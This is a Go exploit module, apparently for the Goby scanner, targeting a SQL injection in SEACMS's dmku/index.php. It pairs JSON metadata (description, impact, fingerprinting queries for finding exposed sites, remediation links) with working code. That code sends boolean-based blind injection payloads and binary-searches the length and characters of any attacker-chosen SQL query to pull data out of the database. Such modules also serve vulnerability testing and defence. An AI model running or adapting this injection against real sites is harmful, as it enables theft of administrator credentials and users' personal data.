package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SEACMS dmku_index file SQLI",
    "Description": "<p>Seacms is completely open source and free. It is adaptive to multiple terminals of computers, mobile phones, tablets and apps. It is no encryption and more secure. It is your best website building tool!</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "SEACMS",
    "Homepage": "https://www.seacms.net/",
    "DisclosureDate": "2021-10-27",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"/templets/default/images/js/\" || (title==\"seacms\" || body=\"Powered by SeaCms\" || body=\"content=\\\"seacms\" || body=\"seacms.cms.nav('{$model}')\" || body=\"sea-vod-type\" || body=\"http://www.seacms.net\" || (body=\"search.php?searchtype=\" && (body=\"/list/?\" || body=\"seacms:sitename\")))",
    "GobyQuery": "body=\"/templets/default/images/js/\" || (title==\"seacms\" || body=\"Powered by SeaCms\" || body=\"content=\\\"seacms\" || body=\"seacms.cms.nav('{$model}')\" || body=\"sea-vod-type\" || body=\"http://www.seacms.net\" || (body=\"search.php?searchtype=\" && (body=\"/list/?\" || body=\"seacms:sitename\")))",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.seacms.net/s-2\">https://www.seacms.net/s-2</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/UFbgsg8LcWs1EAuZ2uPu0A"
    ],
    "Translation": {
        "CN": {
            "Name": "海洋CMS 建站系统 dmku_index 文件 SQL注入漏洞",
            "Product": "SEACMS",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ],
            "Description": "<p>海洋CMS完全开源免费，自适应电脑、手机、平板、APP多终端，无加密、更安全，是您最佳的建站工具!</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.seacms.net/s-2\">https://www.seacms.net/s-2</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>"
        },
        "EN": {
            "Name": "SEACMS dmku_index file SQLI",
            "Product": "SEACMS",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ],
            "Description": "<p>Seacms is completely open source and free. It is adaptive to multiple terminals of computers, mobile phones, tablets and apps. It is no encryption and more secure. It is your best website building tool!</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.seacms.net/s-2\">https://www.seacms.net/s-2</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Target",
            "type": "input",
            "value": "select database()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.7",
    "AttackSurfaces": {
        "Application": [
            "SEACMS"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10688"
}`

	doGetewdjkjl := func(uri string, u *httpclient.FixUrl) bool {
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0")
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if strings.Contains(resp.Utf8Html, "{\"code\":") && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"count\":") && strings.Contains(resp.Utf8Html, "\"data\":") {
				return true
			}

		}
		return false
	}

	replace := func(str string, format string, target string) string {
		return strings.Replace(str, format, target, 1)
	}

	exploit := func(url string, u *httpclient.FixUrl) int {
		xx := 128
		xs := 1

		for {
			x := (xx + xs) / 2
			payload := replace(url, "{{{X}}}", strconv.Itoa(x))
			if xx == xs || xx-xs == 1 {
				break
			}

			if doGetewdjkjl(payload, u) {
				xx = x
			} else {
				xs = x
			}
		}

		return xs
	}

	blasting := func(url string, length int, u *httpclient.FixUrl) string {
		result := ""
		for i := 1; i <= length; i++ {
			result += string(exploit(replace(url, "{{{LEN}}}", strconv.Itoa(i)), u))
		}
		return result
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			vulnUrl := u.FixedHostInfo + "/js/player/dmplayer/dmku/index.php?ac=so&key=ssssss%25'%20or%201%3Dif({{{TARGET}}}%2C(select%201%20union%20select%2099)%2C1)%20--%20-"
			if doGetewdjkjl(replace(vulnUrl, "{{{TARGET}}}", "false"), u) {
				if !doGetewdjkjl(replace(vulnUrl, "{{{TARGET}}}", "true"), u) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			target := ss.Params["Target"].(string)
			target = url.QueryEscape(target)

			host := expResult.HostInfo.FixedHostInfo + "/js/player/dmplayer/dmku/index.php?ac=so&key=ssssss%25'%20or%201%3D"
			template := host + "if(length(({{{TARGET}}}))%3E%3D{{{X}}}%2C(select%201%20union%20select%2099)%2C1)%20--%20-"
			length := exploit(strings.Replace(template, "{{{TARGET}}}", target, 1), expResult.HostInfo)

			if length > 0 {
				template1 := host + "if(ascii(substring(({{{TARGET}}})%2C{{{LEN}}}%2C1))%3E%3D{{{X}}}%2C(select%201%20union%20select%2099)%2C1)%20--%20-"
				template1 = strings.Replace(template1, "{{{TARGET}}}", target, 1)

				result := blasting(template1, length, expResult.HostInfo)
				if len(result) == length {
					expResult.Success = true
					expResult.Output = result
				}
			}

			return expResult
		},
	))
}
